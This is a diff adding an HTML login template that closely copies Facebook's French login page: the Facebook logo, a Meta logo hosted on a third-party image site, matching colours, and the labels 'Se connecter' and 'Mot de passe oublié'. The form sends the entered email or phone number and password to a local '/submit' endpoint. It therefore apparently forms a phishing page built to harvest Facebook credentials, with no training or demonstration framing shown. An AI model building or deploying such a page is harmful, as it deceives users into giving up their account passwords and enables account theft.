@@ -1,0 +1,127 @@
+<!-- templates/login_page.html -->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(to right, #D0E6F4, #F9E6E9);
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .background {
+            background: rgba(255, 255, 255, 0.0); /* Fully transparent background */
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+            border-radius: 15px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .language {
+            color: #333;
+            font-size: 16px;
+            font-weight: 400; /* Light font weight */
+            margin: 0;
+            margin-bottom: 40px;
+        }
+        .logo {
+            width: 60px;
+            margin-bottom: 60px;
+        }
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 30px); /* Adjusted width */
+            height: 60px; /* Height */
+            padding: 0 15px; /* Adjusted padding */
+            margin: 8px 0; /* Reduced margin */
+            border: 1px solid #ccd0d5;
+            border-radius: 18px; /* Adjusted border-radius */
+            font-size: 16px;
+            font-weight: 400;
+            background-color: #f7f7f7;
+            transition: all 0.3s ease;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+            background-color: #fff;
+            box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
+        }
+        button {
+            width: calc(100% - 30px);
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background-color: #165cdb;
+        }
+        .create-account {
+            width: calc(100% - 30px);
+            padding: 12px;
+            background-color: #ffffff;
+            color: #1877f2;
+            border: 1px solid #1877f2; /* Reduced border width */
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 80px;
+        }
+        .create-account:hover {
+            background-color: #f0f2f5;
+        }
+        .forgot-password {
+            color: #000;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 20px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .meta-logo {
+            width: 80px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background">
+        <div class="language">Français (France)</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+        <form action="/submit" method="POST">
+            <input type="text" name="email" placeholder="Numéro mobile ou e-mail" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+            <button type="button" class="create-account">Créer un compte</button>
+        </form>
+        <div class="meta">
+            <img src="https://www.upload.ee/image/16960701/7trPSpNFerC.png" alt="Meta Logo" class="meta-logo">
+        </div>
+    </div>
+</body>
+</html>
